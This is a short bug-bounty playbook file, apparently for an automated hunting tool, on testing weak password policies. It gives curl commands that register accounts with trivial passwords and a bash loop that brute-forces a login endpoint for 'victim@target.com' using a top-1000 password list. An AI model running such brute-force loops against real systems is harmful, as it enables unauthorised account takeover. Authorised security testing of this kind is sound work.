---
name: attack-weak-password
description: "Weak password policy testing — brute force, policy bypass, and weak credential exploitation"
category: "authentication"
version: "1.0"
author: "bountyreper-official"
tags:
  - password
  - brute-force
  - authentication
tech_stack:
  - web
cwe_ids:
  - CWE-521
  - CWE-307
chains_with:
  - wstg-athn-07
  - attack-rate-limit-bypass
prerequisites: []
---

# Weak Password Policy

## Objective

Find weak password policies that allow brute force, credential stuffing, and weak credential use.

> **Attribution:** Methodology from [KathanP19/HowToHunt — Weak_Password_Policy](https://github.com/KathanP19/HowToHunt/tree/master/Weak_Password_Policy). Licensed GPL-3.0.

## Testing Methodology

```bash
# Test weak password acceptance
curl -X POST https://target.com/register -d "email=test@test.com&password=1234"
curl -X POST https://target.com/register -d "email=test@test.com&password=password"
curl -X POST https://target.com/register -d "email=test@test.com&password=aaaa"

# Check for no complexity requirements
# Try: 123456, password, qwerty, admin, 111111

# Brute force if weak policy + no rate limit
for p in $(cat top1000.txt); do
  curl -s -X POST https://target.com/login -d "email=victim@target.com&password=$p" | grep -q "success" && echo "found $p" && break
done

# Test password reuse and history bypass
```

## What Constitutes a Finding

| Condition | Severity |
|-----------|----------|
| Weak passwords accepted (1234, password) | Medium (P3) |
| No rate limit + weak policy = brute force | High (P2) |
| Default creds accepted | High (P2) |

## References

- [HowToHunt — Weak Password Policy](https://github.com/KathanP19/HowToHunt/tree/master/Weak_Password_Policy)
